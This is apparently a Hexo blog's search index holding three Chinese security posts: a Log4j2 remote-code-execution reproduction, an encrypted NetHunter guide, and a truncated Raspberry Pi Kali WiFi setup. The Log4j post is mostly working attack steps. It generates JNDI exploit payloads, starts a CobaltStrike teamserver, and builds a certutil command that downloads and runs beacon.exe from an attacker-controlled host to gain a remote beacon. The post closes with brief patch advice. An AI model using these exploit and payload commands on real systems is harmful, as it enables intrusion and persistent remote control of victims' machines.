<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Log4j2 RCE漏洞复现</title>
    <url>/2021/12/30/Log4j2-RCE.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证， Apache Struts2，Apache Solr， Apache Druid， Apache Flink等均受影响。</p>
<span id="more"></span>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-1.png"></p>
<h3 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h3><table>
<thead>
<tr>
<th>影响产品</th>
<th>漏洞类型</th>
<th>漏洞评级</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Log4j</td>
<td>远程代码执行漏洞</td>
<td>严重</td>
</tr>
</tbody></table>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先去<a href="https://github.com/y35uishere/apache-log4j-poc.git">GitHub</a>下载漏洞poc代码环境，使用IDEA加载项目文件</p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-2.png"></p>
<p>打开项目文件src&#x2F;main&#x2F;java&#x2F;log4j<br>在其中添加一行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-3.png">  </p>
<p>接着去<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">GitHub</a>上下载<em>JNDI</em>注入工具  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-4.png"></p>
<h3 id="生成EXP"><a href="#生成EXP" class="headerlink" title="生成EXP"></a>生成EXP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A <span class="string">&quot;192.168.31.201&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-5.png"></p>
<p>将生成的EXP代码复制到漏洞POC代码中  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-6.png"></p>
<h3 id="运行POC"><a href="#运行POC" class="headerlink" title="运行POC"></a>运行POC</h3><p>点击IDEA工具栏<em>运行</em><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-7.png">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-8.png">  </p>
<p>成功弹出计算器！漏洞利用成功！  </p>
<h3 id="反弹Shell上线CS"><a href="#反弹Shell上线CS" class="headerlink" title="反弹Shell上线CS"></a>反弹Shell上线CS</h3><p>运行CobaltStrike teamserver  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">teamserver.bat 192.168.31.201 123456</span><br></pre></td></tr></table></figure>

<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-9.png">  </p>
<p>打开CobaltStrike连接  </p>
<p>新建监听器保存  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-10.png">  </p>
<p>点击<em>攻击</em> –&gt; <em>生成后门</em> –&gt; <em>Windows可执行程序Stageless</em>  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-11.png">  </p>
<p>选择生成的监听器，输出格式exe  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-12.png">  </p>
<p>点击保存  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-13.png">  </p>
<h3 id="启动Web服务"><a href="#启动Web服务" class="headerlink" title="启动Web服务"></a>启动Web服务</h3><p>在生成的exe payload目录执行：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure>

<p>浏览器访问验证  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-14.png">  </p>
<h3 id="构造CS上线payload"><a href="#构造CS上线payload" class="headerlink" title="构造CS上线payload"></a>构造CS上线payload</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;certutil -urlcache -split -f http://192.168.31.201:8080/beacon.exe C:\Users\a.exe&amp;&amp;C:\Users\a.exe&quot;</span> -A <span class="string">&quot;192.168.31.201&quot;</span></span><br></pre></td></tr></table></figure>

<p>将生成好的payload粘贴到POC代码中  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-15.png">  </p>
<p>点击运行</p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-16.png"></p>
<p>成功上线！</p>
<h3 id="演示视频"><a href="#演示视频" class="headerlink" title="演示视频"></a>演示视频</h3><iframe src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/log4j2-rce.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>

<h3 id="漏洞缓解措施"><a href="#漏洞缓解措施" class="headerlink" title="漏洞缓解措施"></a>漏洞缓解措施</h3><p>（1）尽快升级至最新版本</p>
<p><a href="https://github.com/apache/logging-log4j2/">https://github.com/apache/logging-log4j2/</a> ;  </p>
<p>尽快升级Apache Log4j2所有相关应用到最新的log4j-2.15.0-rc2版本</p>
<p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
<p>(2)安装杀毒软件更新最新补丁程序</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇文章介绍了Apache Log4j2 远程代码执行漏洞的风险及漏洞利用过程，以简单直观的过程告知用户其危害以及防护措施。</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A">https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A</a></p>
<p><a href="https://github.com/y35uishere/apache-log4j-poc">https://github.com/y35uishere/apache-log4j-poc</a></p>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞复现</tag>
        <tag>CobaltStrike</tag>
      </tags>
  </entry>
  <entry>
    <title>NetHunter安装不完全指北</title>
    <url>/2019/02/21/NetHunter-Install-Guide.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，密码错误!" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5c8385b2fa692269b33492af134879fd78ddddd998838da2f0ae7f53fad2bc4e">b6f8a705a82e0a72a5324e1143428113db192bb378175fee9c88f516e41a9e8241d28c494f63af39e09d5c6391c085fee762237b544ed1afc09d2779557f93f7256530ecdc50c2e0ae8af8f869ce0d10dc5253dccfc8ac05c40958a0c7c8946e43e510b94c4cf4ec661c2a22c27aad23a3a7d7b7ef1a664580c93d450ca479319fa267e1a85ec724cddfc11c67fe628ff36c2bd2b6914c0d94f901e6e04c79f8e99685f5a1de37a07ce0b897d6de43d1c565751be2aa54b3b5065a3a1865bdb0a62f91057a34ff0007979bd96b6bf8870cbc7ac281bf78d1d9bee8604dc2be84e10abd3ec4073a1fe6b197928549562081ca193c529fdcff0a482510600ecd3ed45c6fc02365142f617b556ce7e91405f4f1925d0c687b2bc04d944bb302d7a4efb5b690619fcdfbe8ea297200a1fbcaa3a563bcb93bb970a51e00ae846a102b7af3ffc6edbc2166479852491b4097a82f78da848cda3f1fc43a25ab8b7c7c16bac3916a1104e4f01d3d877773164861f10cddd32e22715237b56675fc236e271c10b9ed50b2ec5836ee51ee015696945c9d8005a93383613fe7976a545ab47c6c90543b7dca76e39f43b52bace5bf8f7f80642162f57631fa54fc0bf417a911e3231f1584f52ed522a26e8c1bd28c20a0c083959331e304c5befeffc45d9ab1b50c20792cf2c3df323d3776590e4e45411313b46b43f1f435b735074377da04e32f47eea537f0bd61397e9e3d5a4c0fe4df95de15e292842d4efa2c50dbac3c9165cd8cc7a0e272b3aae1930efa109301b7d825a1ec351a4ced78a62c7bc48293e61d3032dbbb8f77903f9d5601a4d5006d71a4434bba31300098dbc8c583df5b3f18ee5e6e3e3ecc8c9daffa9ab1c392268ae4a25688856594d18f1013358fc694d5442ff6b212836d3055c2af9a6d177b47ae48a4d2d9ea9d8593e52d0d5112101ba5ba5af071192da748e46bb2d401fce1dca94ac86085738ac6857447c2822fbbff33cfb67c1f9ac1a0dfdeb91a8201b620eeda2e1ed9ab93a7e60438e42952bb4288bf45187254cdfc66ff3e931486827e7c4b458592db8495b62e18058c57c661b8dbb310302cbf4ac6be282415984594cc92b53003bf45b17ef38faaab19c0eb2d6782ffb8427fe8812678b42c105f36162ba4d51ff22bd1c3cbf425f2e0b87f6d22f164026c2e394348cf864bc1864ef6dec5f2ae29d1f9470c9f2ab2647d5dd75aa0f05b6ed77c8a8354a91465a2f09159f281a5591e1ebb8db54acbc7779574aea78ed4e30446583fc9005174116915ef124d5269c3d916b7a7b6346e1c310feac7e8df929be19ab592b425f4b6f4227f7528d1c7bd07d0fa172f737c505d7056d463c5a7630293f498a5b1140f95ab100bbb81796f662943c9e079dda8f8823aade28d59899d4c39ddfab2f49817cd9f0add2d17b53f86114fab9440fd96d8cf5af5f149bd30a0f6075b6f6048a624279b200645eb2e62e42a26cd3f28e82d6a58faa59a77529a962ad09164525a744fbcdc55a0ff0025632f98b2c52ca0193628383d959cc3b34e272f728190c12d9cd702f4b1dc07e9623533ecadfba395757e169e7cfbd5324e9b2b4307f519456d225b429e57abe7e06ef3f1796ebf7f09b32601699da517a71eb6a2aefe09e8e1eb86a7d8fb712c0adc9aa78d43f6445dc4450a2966458f648e92481cbda8d5d85c217590bbc7c2db38112333a055ba5f4c3ab6302e7af653b91390dbb06b8070e35d7b7a87ca9ab393e9c837ac639b4946481299e743a4914ac1e54cc1335cbbf30ef45231f8666c73d138fb1f68d895db64208e4b8ce212f3ebc36bcd454a691824a9873b0a210c3f875d3b1d6f4aee1b327935d9f73adca12eba725d9a184139026d9753f447c0f7e72c6ad0b883d518e73ba7a0efd112462d19575c360f7c8516ea6c56f1d8ecfda44899241a304d64d1477ccaef563dbb479c95dea4d3793ff10a81e731136c9436d20c3c10ee78d11272d0805bf00e52b7b682744de559a276f82f94cd81c8b16adf554a8168c3244591c3d9944c50c26a138b00882dbff3b5835977d287210ab2ca999465e7043db51d2ba878ea3a93ab9ef31f75830b167a81ecbd56937e11d17e8e01fa0f1e55c65b4b4d8c6523f9a277f3cd32e508525e31891f7b02a6fa358dd50ea4b22c6f0fff04beb77e5eba155ad1e8170dc021687e52194ff75c2ea2f742cbbddd7055730635c205ebddc0f61bc57f2c4775c78ad3c7ece6990201d1b4f20234689f0aca91a6ef07fca6068fe0aae9526a90675d234e160cfde50105623ba445969f8e44818c8a1a0e7d1b973cf65e385b47ea802b200161bda420cbaf696a49e20e14847b7b98304692e51de755880874a885bc9fae395a672bdf5165e35eac1938ebfa458d4b128ebd5c67dd07520b084c2abc6844f32f217aa45c05c9722accc38c32801524457a2ed6ebb6fb2f9390f5d1196333db077a05bad2d3bbc2f6e66ac131742d809b7fdb0175bb922ce8eb3114e183dc16444bc752471ce6688e9e89335d7c283e6171cd4c4302668a83ddb1a822a318757615eae02cc1d629a2c71f15c51405cdc3e7422c5b67b8a9af2981d826589cc8a8dddb8155c73d9f4a6bc4f7a8a77fd52660f8933b6bfd86410a26118008306cd65a82e4d28991cd7f049265f5b65b19cbbfe226051225db772fc0d9d215bf76a4e65971aa2060fb560bcd409e805446c41fc4627f4b1a36bf5e6248eb44024e4870695823c8d00a8e31e6cc909580c3fb3139cb05d597c5fe36ba1d76b92df253a60e501a0466eeeaf341f5197e52649de4a75dbbd784ecfea162fef466ce9fdfb035ba474a62685ebf146c605c9f09ada46c5d43b3195b7e76912cc96d6fefe36015b213ad56ae438b2fc5a472d66b5d70b369e1a90860145412ea15dff5d6a1733c2f6a215b8609c68ab25edb073e96545bacd5222930f7ed40f9389b3aeb59e51651b6ad0c680afda960b882e19e6d68e25173e50a74fd57fa1896f019ec420e8db976c27341f0e9186d7de55802c131a5330a64672b30bd5429ef412d17f298852b7940e40e6f0466f53aa8a78f31918afb3a111f4dd976e0e99c8a42e1e31fdb31b03c9263304a6147632ff03bfa0e5f42550630e748702e7f73886aeff97344ef91a8e85e8c933fd1119f32f53a2e2b4de824dfd187ba844bfff3abe14da0a69d2a7d74c425dffcfef8f80715c2cd764eae19e43bd7325aa9cb3273cd57f056f6b703f0e65938735977d5125be140c8c8af4abade79cc05be13027d781514ec6a3ed72d1c72439ad6fda05a0e3232cd41b1e5738e17d99b1e2457e3b158b970195e39c6e401fa119ffe026d5e1d9178743ef465ee60722cd8d7d77b4765a8e7b8d4926daeffa75f09fdf418243c3583c3a9d95ad61f937b91c5f244aeb99b74d3173d68dbb14f9ca9fdb248470bce92815a1fa589ed2d218c33d05ed72357a0bf06707c0ad058e98c648097915c275b1aa6c74c2cedf530f541ed76ea474d53e8b99a22f9ef71f53b576f5f1fd03f1ff6e66a1cd55638c22a3a7d3c9ab8d2067280466d96852e01ffccccc377a10bbd0b4b9dc95b6a2ebb4f0974ad0de7e3c87da3a8575d91e4787fd85c4d2954d39e06507acb5fa23ae96b1e4c6c3d300ed3900301b41e888620e68118776f90295c2758c8724bd887c0c77590fe29210d3eb963d4b17f3d51861e46742a6f8d342f934bff1ae74134f3115b26401a0b6962ba62cdd5dfd8980d3ece4a68c536d29a989ff9f338f872863f0a8b9c2e4350181f712cab2e7abeb2c0ba98be123be8d45eca981f2a5733ec3a4f08fcc4c8dd888eb632d2137e287214dbee022eadafa52764d6cb8dfadfa9dd0561ae0d2ed16af411464f8457892f50231833e0c5b36a1170e01556a5761716cc2874c9c6c10c3042dc1f3f18934612051f1aa0c46f791622a46cc5fdc487e98e8b59e95e79d1f5903729c05987f12415f8aca35426d8ddba034504b595e013ebfa2a5ed6dfdc5c8329bcd8955693a743951b225df7432ef1b7b3d4c9275a5d6d6d2c954083125e616a9e789c2060fe78e9eed8a6c7afbf293e2749f5b653e6026699d9e82c766e0505f5850647bf60557c2f295e90b5ba4d5af66fd5d5fb894e35f4f206a588eb41fcb922c9249d58a31c2d4581c52f53e0c3303b5c79aca0eabf81280f6bc980e7ea707b2ea9815fd45b68c0d551922c0716c13bfd8fcdddb05029df247b19090ec191116a4b9eec002f9756394ea9ccfa5ae6a36d20065318b9aa504ab35f22705f0075fc6efe9aabffe4460a1302d73b3da1cccb477e7585acc07bc99f1a1ae91542d7775b3fe32fc2549248d71e7f71723e955469bb04ac222fcd8fe9c8d3f1bf17b79ee566343367f2ebf7297a62e77ddb4c300671c5ac9f37a31303f4eb72d03c1459bd05df39559ba31f2fea9da2d7e34d3868dc3589bbfb4fd05490c7b4eed83450a86d272cf29665a5a74b8e2f680f63b8cdaf8af61039955000588f4c5ecfc20fd06b276a7f411a691f4e6c0e0f89769345b58c6156c1e9a6edc94d4edefda4906655d98d2cc57b367f3a5820367a170a9af2627c343fef05458ef662cd7e55a2572a38eb5c49a9297e6bd67515491710afae1e4e2d16c7c6da880e551215ee63f34caa19745efc0c39f3cdcc628510f3f3c649ab2fa2d90f50411af11a27d23426c5c4dc01f14655fe49980d8e41793ee3ea79a3716af550ed7dd932e15c5c5b6d9f7b5fd40dc1991c3237f569240d29e3e33bab3f04407812a1bc1edbee4d044c529a4942d87a4507e92d20f3f77537f61361e7f4572556909277a670f0ecfc8981f7c170ba2b68d8f5f514697771dab4985ade8939bedefc76390211b81129db4e96507ed0be1e6922cca0d4733dbba7b042ba3e66c7d577477b4cf49f89bc5f2dfce1faf4efd49acc11dd33d71661ed802d770c373213cec2c3ebc5988f0ea613ea5ce21c14ce16135f0b7c469879d8f013ad3391532084676084b9eb220add0e87ce7eb2b45585c2f58b41b1771492fa94bd0db1edb028762ed95f422637c5ff8f59a1adfec91621fbb62b2426cb1ff842b99a94b6ec542e3dcd8d4822417e089201d4a0a8f858cebe4f9cc0714a75174e8d2c26879f47ab7d8588ebc100c2198b2d6ca9ebf245203ce43cd8ba8708dabf459a4e312108d719809df9ded41fd3a1c6f39690de014479639a31c2c543653ba5e18665bf1694050fabf767c90fd006d9fddbbb8e402b74f63d6d8405e947a5e29dfa6a488a3d61b4e4e3e7782cd7bb45c34cd1bd93eef4e2dd3687933d8ada4eadc552874d5d757369a5da88fe265530d666a50c47c187bf57aa1a8214bb7152ba64657ca68e25aa9b11bcbf2696458b96346334b4a46961a5d4101528552851fcd5af252a2e78f2984d614d8cb40297051b87e54a80e4acea8f22582709ed5f1fe61495114c49ee484e14dddec00f9be5b05afa0a0e69f908355cc5ab1b7e99f021b6cd30e51fb24c410bb495622bbe1a1fa2f3d6d26bc0955590349402e5b019f12b841a0246806bae3a8fd0e423e7c5ec3801a84c8bab6b2b870e948ed42c534b24e88d68c4ee7aac97b5b96c899a1dd37caa17b1be3cd7c53db30d7248704836b35182310d6ccbc868d0cb2e82a38e4e17039355a0b334f795aab01f66a23c1fac3be436e4dff3326541e854938ee393b6acad9e43cf4f9a8477174e75eb6d114c3c547c96e278f70cd13872238bcf521306c6a50294825f9b5f19ff72efe21e5cce07417d701149b9bab4cf68d770110454b08c02025b2fe928c3e378bb87567c862de178c2f9b5329eaccd66391a7a70e40b004c8225221b70ae1d74abc4442a4b1e1d263c277b19d3566f8724de92d0eb28476eee03696b13c1ed02fd4cf768c97d53f8714a09bedfacdf1e4622da05b65c2d378f5eb403570646116a2c565e42a9dffcfb1b5374107b61a4b775990842eb155bbc477b548b8a1d0bf6c7149195ecc01ada0f39e52c78442c8ddfeeed785b22c804a9891da0c51a9ccf82528e6bdc39c77abe637bf1b53e4df18489b26bd07a16510c6f8c73091e789f487ac93ccd3e6c826e885a12386c929fecdf249a1566f2ddfb527d9e4a4d3ed913106071cbb371db0d43cc529ab77cbd9edda92c74a100dd65aed0cde978c1dbdc1d522bb16acf53ab15fcec3b9b328464f229a03244437be65ea7d76689b9d8fb56fc726f0d2a9c011ebd67266e163e9c5e48873f8052dd9d15e9f5222820a72dcac671c66bfbb1d81aa737a5cf864dd2eec93601922844f2c306a95128739da6edfe453a97a64af290238ac5346098de8a8601d2068fe914c9658456e44cee694421efa90c1edd5184d3fd8ce845ca8a1f77d0b79a031f561c778833416debd066c9e13ab92e2492ec6932a24867ba7a622228781fe41279c65da49d68ccec5602d93e37edc9313d1f5c757dd815356417180dd310429cc91302fd8990f520a805b7b86e69f0e41d3d5911dc856dc50477b5e1c736fd42756aa5064940a5482939dc5ffd5ed6df600590a5f05ab52e700ebf9957e708d9f7ad85b1dce41d4ae4d17bec53046e29d8e499a032fa8af6d7715e9f3f7e891b75d3687544acfddb082568ee7ce99f44492e5e563ac0e6b7e3d764b272b3d76330a4d4f67862c91f3c53da2289cd2ced70534f2392ff1c73d986bfb2f3f9ca5a66dc445a40a49e86b85df4072913ee3aa388ca2eee03a871369422eaea11277711f17b01e1a2bfe48fa63013ee235a294adf328e69c7e8c9c8964fcd271b0cc137e52b80290951e4e8e4703238d63cd2dd1c80eee3fe8a3d311206d1cef5a3b330c0f35cab91b0d8f28946ff6b17a478a5f6e90b226d056631a0ec0448d2d1dd2d03659946b027344cb6583a4a45d00bb3882532052ce41f70b475bfeae98b4ccc666873ba58b3eb7923ee3d37ee78237c7a1df5c7a0247bed45524d03bc034b91dd009f001e28ea31be82406586dc80029e22f41924f86b8eb6f1890dcf3fc6f965f85cfe67aaf62e157e5590ef70e806d6ce68a2ae43a2b1c5712171d30f69dbc31b179e4542e1d23aef3ce88a86b76068cba4d3691b4f3d16849b6f410fc14e5cae0e083a2d99966c4eaedd1042ba594f3ac7d5991497bbc6162a3e1f3ed372672a021a8097c23b33490a5b9f4e847d1a16e35eb42cf9eb7fedc61e779b6fa36a750a499a86c14c772bb2987a7a7c41d9f93a9e43167c56076fac9c39b11ced76ef5ca510b61929f9588c9e1a5540629982e89069ca0f0d9ca8e3c17b7339c040a7186aa1cc8222ca8c639db1fb7930a6637dfee956304413ee03b9198f5a173d29f5102924279b5b2653411c25aa47a64538617dc19d2486b2e3d7a6060ae5ee7acdd891acf9bbfe246b797a1f3729e9b9564d9e0b36ebeea731c2abbcb198c23aa30b7ebe0dbecc37e709e042ed25fcb060b5d817823c11f771cc31f78530d47db1f0a4f7a896a93472c40fb53ebefcd56f4a4030c9131fdcb9e8df69bc3aee2f2eb9be9502e1f13cc3373e5120f5b0f496bbb991e2b5f5f0f4603017ef9daaeeb1e72f0218ecf793d7256960ba10537d34fc6085fd76c10a3165b0dc17b6ac3de345a8f7a6924a1650c0968760fe28d831776c58a1431828c8e5fd95e83315ad00e2a5e736a804dbb752dd30dff321b7ca063b2e9ee8c50305558a5baf4ad28dc3e6151735f5e4ae4ff6aee5117baa86eb81b004374dcae5788cc430d9116a5cfe29e34219029f5276c26c4d2b6d8b254b7dbbca756aa1cc790324c904421a6c21a1697de92cd5c648bc304212084e15b7f08993c4d63b65d693efbedeadf84892d2ff535022e9d7a746a753995d1e8486754bf499c56132192cadaa3ec8703ab9fdd6c5e94379f146d559a7e149d5d252e46a643d14a95a90eede556361b530476ffc9ef2089ab351ebc3d5f25dcc2e6dfca9e2266ed5fa7a596ee28f1c9fdd620c5dc0ff8d4b57be13dbf224264466345f984d882391c310a861dd22a24b6b9fa9b543528f8b2c4effa06868540cfe02caeaa0334405111003e009ad8a01c4893f420d6268a974ac0bac09c8a8f45dc91599374d8505b9786bbe324cd5bf9c6c1e013578b880ab426549b6f014e6db23a8c0169547f9199bdc5c639eeceddd2a5a3a24f10de875245524539a0ecb8dbe52bf8523bbf0e796c89cbe616826d713321906881949c08276724af4f8e9fdfc4bf0e65d771dae36ef886493a9f74ffd8a85b6088daf34be0ebd166225e86952aed208a6b8f7589179d2b8ae6f1ecf635e09a2a9cabc79a6ab5569d1a07591477d7b8d8665ed6941c299a84ef1d3b5f12f7b64a17f8bfd70cff083a4cea0f4131c430f24fb87ea4b278bf9f81ab9a51f18a86d5c8f029470fdc1cd2649957611400e393597b1b39098d4950aa6fc05989b689af038f01695c0388bdabdeaacd71dc571e71b64b7cd81b36e311ed41038bef7ece0653596a63f058778521451afa4256031974dac4e307bca321ab20460525d1bbe41bbeec21f7ec6cc44109fc689f25204f6785f148fd63914a966f04b3a42e7ed7e15c1b1c472f9fc54b1055b3824504881df835055f4b6b3a454270f2bac957f58d2f87562b0375021596b27dd5d4e064ebc07a23ed08262e199411119ece3a23be4e690402462d10f3babdf83c1a3315569b924e03e28276c35d549814241b7ecb79e5e35e7d3084213d9d81a4f646b9dfb55b876fca5ef319865963eb7a87c188ccb4f7edd1b3a39d9d4f3f58ea3bcddf69be238927609d7cfa2c6e08aeef92a024f0e164a931a20e50505fb885f5dd7bf95f91dede76ac755a658bed43c9702716b1ebd4d8c13e243d269c1988746f4ab38314e5770ad233296cb3a05e95063b303889132b5761f536464c4be0eccb2c13ce8529f4866f48874cabda81b942cfd63a05e6ebd9b0c47bd8f29128cd3c47a9613fe1036892ae2d6b98412888bb67a49907492d0ba417eba5c5a48f519652d57362bff45aca521702b316451db0dce32f5824ca3090a38b5ad222405767fab2e7768c6448def8f5df2e8b52292fb3e971e98595be645163d8864a496e05f54b91b34436f532e4193538543585c412b59106600584f40cbaa168a0269a3ed855ffbd16159c0c1ec5e887051cb8acdb320b4fcd2fa0d8a0199ce9bca0c508bf33255df8cda0c2788e0c67b8fe84efc8e93d56ffdb2a415c61ce9ea58fb1ca58dd26285da2fbb2a21407b4d28f89ce5a220097fd05c47c7e35afff581b50065652d4b86849a158191e74ec1a0f2fd2e274a66877128da9f5151a6d60d67717f408fbb58388b018028dca2b41ba0ea89298b7062cc57e55718c224100595c0a9cbc359b63d640b0dd99c58ea3b6c86d33979b000c565665e15193c18f02a2b2f3253eb9cc26bd17be7172215b260f5fc5bf7ca9d7b68b8f6f818c4821771e88efc2635a2be93b294fb394279f6053f2a99c670856168bb33ade3b3ee83eee65b19202a9db76480da8a73ebf72ee36d18d912180efb143e7af27275cf9dbce597b5ff63b48f956f0aed2437b21a3551c46731d4ce2b0315543ec4702c313c93178ec0f38053d23956aa6a94f7237758712906bf9eb95ee0daf971d2b3f09580ff96fd5cdf073c3cc4a0dd1ad4d593c4a7e59e686a5e33150a6d457fe3701de5416b886b42b8331f682ef1be19574cf649b32ae92eb8cd50b1f6656785838c215c5ba9297e7da14e927f15774c2f25de15954284923fd36fcbf1ec8ef2332caa2d36f4804de0b8187d438949a6d3dfbf7521c04189ec613a51df14e4d37322bc98efde5453497e69093d1df2e7da10e573b7d7ec9a1e38bdc15ab7d45e9034a71c8b86bc36812bee53a046eca8f98f1c004a1eaea4a7d4f4f9b8d68b5a2df19569a6657d5427a05ab2beac12fd81c915dee47753c9e16173368bb23718c4f2c97b354b897ca28d02dce4bd6e448224fac43b2d0a634286b55224e286ab3c3e9607dd3c702280bd9f902537ddc5ade3094ac671b135701b2c3bf6566966627cbb87ab7644a91c662d180b0c14ef686156a87da86fda17ba71a0cd307e5fb0f3f1130871a90020cb639d592baa66d1a8a60859b09159cce936b82040a7e7b5a0b38000a3698fc8f0f74ca8d35b9d9590953e9f7cff68184edaa84146c9097da4c3944c858d5f2da7c5413d213bcc5aa3f7933d2ae0d8b33c8c9c07fa2b456a2147b8a0566e84b1903c1d4163ecaa3a28a5f6f754b94b5a9a1209a14e37d308ce794f84e84209ae26715ddc6dbb1e5816a02bd1d46aef1e9d76bc830a685e54a1f6365f469dd34bb3453b088365addd4c7494c87d14596c907da256c6066afbbd522aba3f65238146912b8f52c29b2482b0bed04950439825d3dbc4ed952b645dd7584a33863cfcf08d65ad3b1083fbd90b731326b4478493de0f9e5275077e45cc359179519b0b416e15a817d14899384b79048aeb2040e826747af7b871921bdde0c61417ac0dd7d0c5dda94dcdaf67e2170d28f32b514aac3f8d0545528c00b2101d9b9fe63b5bab1cb5b508c7204bc6963f3b1bb04b0714ee051c600f66e981c3c5f5d2616ee312e1519bcf3656b3a590bb51eee8113e655ce1ec3015db83de16bab2ff8d8cf855ca59c6b0907b1861b1ca1e290383e321ec1afdb0a8bf32340adb4c0b2e61a0881fb64aa2c549dfc12dfa0cd7450f2e377923a70bf192196d3d787319aedc3c3c38a4aea157dacfa5b13f10eedcaa37b45cdaf589a91b30a3cea3fd0f0c14892e5c75d17c50c36e3371e53c4903363c0113b8c67141cfa1e15ac4392ea240c29edc8a31a21b5b08152e43f3271ac4c689</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看本文</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>NetHunter</tag>
        <tag>chroot</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派3B-Kali-Linux-WiFi配置绕坑指南</title>
    <url>/2019/03/23/RaspberryPi3-Kali-WiFi-Setup.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天有空给树莓派烧了个2019.1 64位的镜像，但在配置WiFi的时候却遇到了一大堆坑，故写此文来记录一下绕坑过程。</p>
<h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><ul>
<li>树莓派3B 一块</li>
<li>读卡器一个</li>
<li>8GB以上Class 10内存卡一张</li>
<li>电脑一台(实在没有手机也行)</li>
<li>Micro USB数据线一根</li>
<li><h1 id="5V-2A电源适配器一个0x02-下载镜像"><a href="#5V-2A电源适配器一个0x02-下载镜像" class="headerlink" title="5V 2A电源适配器一个0x02 下载镜像"></a>5V 2A电源适配器一个<br><span id="more"></span><br>0x02 下载镜像</h1></li>
</ul>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>下载地址 <a href="https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz">https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz</a></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://images.offensive-security.com/arm-images/kali-linux-2019.1-rpi3-nexmon-64.img.xz</span><br></pre></td></tr></table></figure>

